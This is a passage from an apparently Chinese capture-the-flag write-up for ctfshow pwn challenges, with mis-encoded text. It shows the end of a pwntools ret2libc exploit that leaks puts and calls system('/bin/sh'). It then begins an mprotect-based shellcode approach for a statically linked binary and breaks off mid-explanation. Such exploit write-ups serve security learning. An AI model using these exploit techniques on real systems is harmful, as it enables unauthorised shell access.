&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;main&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;puts_got&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;got&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;puts_plt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;plt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x6b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;puts_plt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;puts_got&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;O.o?&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xf7&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#\xf7 æ˜¯ç¨‹åºè¾“å‡ºä¸­ writeã€puts åœ°å€çš„æ ‡å¿—æ€§æœ«å°¾å­—èŠ‚ã€‚é€šè¿‡ recvuntil(&amp;#39;\xf7&amp;#39;)ï¼Œå¯ä»¥ç¡®ä¿ï¼šè¯»å–åˆ°çš„å†…å®¹ â€œåŒ…å« puts åœ°å€çš„å®Œæ•´æœ‰æ•ˆéƒ¨åˆ†â€ï¼ˆå› ä¸ºåªæœ‰é‡åˆ° \xf7 æ‰ä¼šåœæ­¢è¯»å–ï¼‰ã€‚é¿å…å› ç¨‹åºè¾“å‡ºå­˜åœ¨å…¶ä»–å¹²æ‰°æ•°æ®ï¼Œå¯¼è‡´ recv(4) æå‰æˆªå–åˆ°é”™è¯¯çš„ 4 å­—èŠ‚ã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;#å¯è¦å¯ä¸è¦ï¼Œåªæ˜¯æ–¹ä¾¿æ£€æŸ¥&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LibcSearcher&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bin_sh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;str_bin_sh&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x6b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bin_sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;pwn_049&#34;&gt;PWN_049
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šé™æ€ç¼–è¯‘ï¼Ÿæˆ–è®¸ä½ å¯ä»¥æ‰¾æ‰¾mprotectå‡½æ•°ã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_049&#34; &gt;PWN_049&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;checksecä¸€ä¸‹ï¼Œæ²¡å¼€canaryã€PIEã€NXä¿æŠ¤ã€‚&lt;/p&gt;
&lt;p&gt;IDA32ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/155.png&#34;
	width=&#34;1281&#34;
	height=&#34;516&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/155_hu_b973c2d823f63ff9.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/155_hu_b3772a185c0448ca.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;248&#34;
		data-flex-basis=&#34;595px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°æœ‰éå¸¸å¤šçš„å‡½æ•°ï¼Œè¿™å°±æ˜¯é™æ€ç¼–è¯‘ã€‚&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›ctfshowå‡½æ•°ï¼Œçœ‹åˆ°readæœ‰æ ˆæº¢å‡ºæ¼æ´ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/157.png&#34;
	width=&#34;654&#34;
	height=&#34;149&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/157_hu_9ddface01add7ae3.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/157_hu_e826473b4239865f.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;438&#34;
		data-flex-basis=&#34;1053px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æ‰¾mprotectå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/156.png&#34;
	width=&#34;820&#34;
	height=&#34;205&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/156_hu_4c4ae03dbf0da030.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/156_hu_5d71e420e11b0740.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;400&#34;
		data-flex-basis=&#34;960px&#34;
	
&gt;&lt;/p&gt;
&lt;h4 id=&#34;mprotectå‡½æ•°&#34;&gt;&lt;strong&gt;Mprotectå‡½æ•°&lt;/strong&gt;
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__cdecl&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;mprotect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// eax
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;sys_mprotect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xFFFFF001&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;_syscall_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;blockquote&gt;
&lt;h5 id=&#34;ä»£ç è§£æ&#34;&gt;ä»£ç è§£æï¼š
&lt;/h5&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;å‡½æ•°å‚æ•°&lt;/strong&gt;ï¼š&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;a1&lt;/code&gt;ï¼šè¦ä¿®æ”¹æƒé™çš„å†…å­˜èµ·å§‹åœ°å€ï¼ˆéœ€é¡µå¯¹é½ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;a2&lt;/code&gt;ï¼šå†…å­˜åŒºåŸŸçš„é•¿åº¦ï¼ˆå­—èŠ‚æ•°ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;a3&lt;/code&gt;ï¼šæ–°çš„ä¿æŠ¤æƒé™ï¼ˆå¦‚ &lt;code&gt;PROT_READ&lt;/code&gt;ã€&lt;code&gt;PROT_WRITE&lt;/code&gt;ã€&lt;code&gt;PROT_EXEC&lt;/code&gt; ã€&lt;code&gt;PROT_NONE&lt;/code&gt;ã€&lt;code&gt;prot=7&lt;/code&gt;ï¼‰ã€‚protå¯ä»¥å–è¿™å‡ ä¸ªå€¼ï¼Œå¹¶ä¸”å¯ä»¥ç”¨â€œ|â€å°†å‡ ä¸ªå±æ€§åˆèµ·æ¥ä½¿ç”¨ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;strong&gt;æ ¸å¿ƒé€»è¾‘&lt;/strong&gt;ï¼š&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;è°ƒç”¨ &lt;code&gt;sys_mprotect&lt;/code&gt;ï¼šè¿™æ˜¯çœŸæ­£çš„å†…æ ¸çº§ç³»ç»Ÿè°ƒç”¨ï¼ˆç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„æ¡¥æ¢ï¼‰ï¼Œè´Ÿè´£å®é™…æ‰§è¡Œå†…å­˜æƒé™ä¿®æ”¹æ“ä½œã€‚&lt;/li&gt;
&lt;li&gt;é”™è¯¯å¤„ç†ï¼š&lt;code&gt;sys_mprotect&lt;/code&gt; çš„è¿”å›å€¼è‹¥ &lt;code&gt;&amp;gt;= 0xFFFFF001&lt;/code&gt;ï¼ˆè¿™æ˜¯ Unix/Linux ä¸­ç³»ç»Ÿè°ƒç”¨é”™è¯¯ç çš„å…¸å‹èŒƒå›´ï¼Œé€šå¸¸è¡¨ç¤ºæ“ä½œå¤±è´¥ï¼‰ï¼Œåˆ™é€šè¿‡ &lt;code&gt;_syscall_error()&lt;/code&gt; å¤„ç†é”™è¯¯ï¼ˆä¾‹å¦‚è®¾ç½® &lt;code&gt;errno&lt;/code&gt; å¹¶è¿”å›é”™è¯¯ç ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;æˆåŠŸè¿”å›ï¼šè‹¥ç³»ç»Ÿè°ƒç”¨æˆåŠŸï¼Œç›´æ¥è¿”å› &lt;code&gt;sys_mprotect&lt;/code&gt; çš„ç»“æœï¼ˆé€šå¸¸ä¸º 0ï¼‰ã€‚&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;è¿™æ®µä»£ç æ˜¯ç”¨æˆ·æ€ &lt;code&gt;mprotect&lt;/code&gt; å‡½æ•°çš„å°è£…ï¼Œæœ¬è´¨æ˜¯é€šè¿‡è°ƒç”¨å†…æ ¸çš„ &lt;code&gt;sys_mprotect&lt;/code&gt; ç³»ç»Ÿè°ƒç”¨æ¥å®ç°åŠŸèƒ½ï¼Œæœ€ç»ˆç›®çš„æ˜¯ï¼š&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å…è®¸è¿›ç¨‹åŠ¨æ€ä¿®æ”¹æŸæ®µå†…å­˜çš„è¯»å†™æ‰§è¡Œæƒé™&lt;/strong&gt;ï¼ˆä¾‹å¦‚å°†åªè¯»å†…å­˜æ”¹ä¸ºå¯å†™ï¼Œæˆ–ç»™æ•°æ®æ®µæ·»åŠ æ‰§è¡Œæƒé™ï¼‰ï¼Œå¸¸ç”¨äºå†…å­˜ç®¡ç†ã€åŠ¨æ€ä»£ç åŠ è½½ã€æ¼æ´åˆ©ç”¨ç­‰åœºæ™¯ã€‚&lt;/p&gt;
&lt;p&gt;ç®€å•è¯´ï¼Œè¿™æ®µä»£ç æ˜¯ç”¨æˆ·ç¨‹åºä¸å†…æ ¸äº¤äº’çš„ â€œä¸­é—´å±‚â€ï¼Œè®©å¼€å‘è€…å¯ä»¥é€šè¿‡ç®€å•çš„å‡½æ•°è°ƒç”¨ä¿®æ”¹å†…å­˜æƒé™ï¼Œè€Œæ— éœ€ç›´æ¥æ“ä½œå†…æ ¸æ¥å£ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒä¿®æ”¹å†…å­˜çš„æƒé™ä¸ºå¯è¯»å¯å†™å¯æ‰§ è¡Œï¼ˆRWXï¼‰ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥å¾€æ ˆä¸Šå†™å…¥shellcodeã€æ‰§è¡Œï¼Œæœ€åè·å–shellã€‚&lt;/p&gt;
&lt;p&gt;åœ¨æ„é€  payload å‰ï¼Œéœ€å…ˆç¡®å®š 3 ä¸ªæ ¸å¿ƒè¦ç´ ï¼š&lt;strong&gt;ç›®æ ‡å†…å­˜åœ°å€ã€&lt;code&gt;mprotect&lt;/code&gt; å‚æ•°ã€æ§åˆ¶å¯„å­˜å™¨çš„ Gadget&lt;/strong&gt;ï¼Œè¿™äº›æ˜¯ payload çš„ â€œç§¯æœ¨â€ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬è¦é€‰æ‹©çš„å†…å­˜åœ°å€æ˜¯&lt;code&gt;0x80DA000&lt;/code&gt;ï¼Œç­‰ä¼šï¼Ÿè¿™ä¸æ˜¯bssæ®µå§ï¼Ÿ&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/159.png&#34;
	width=&#34;1125&#34;
	height=&#34;494&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/159_hu_fb0f9122edba3687.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/159_hu_6ce7b5fc8e39cc95.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;é¡µå¯¹é½çš„åœ°å€&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;227&#34;
		data-flex-basis=&#34;546px&#34;
	
&gt;&lt;/p&gt;
&lt;ul&gt;
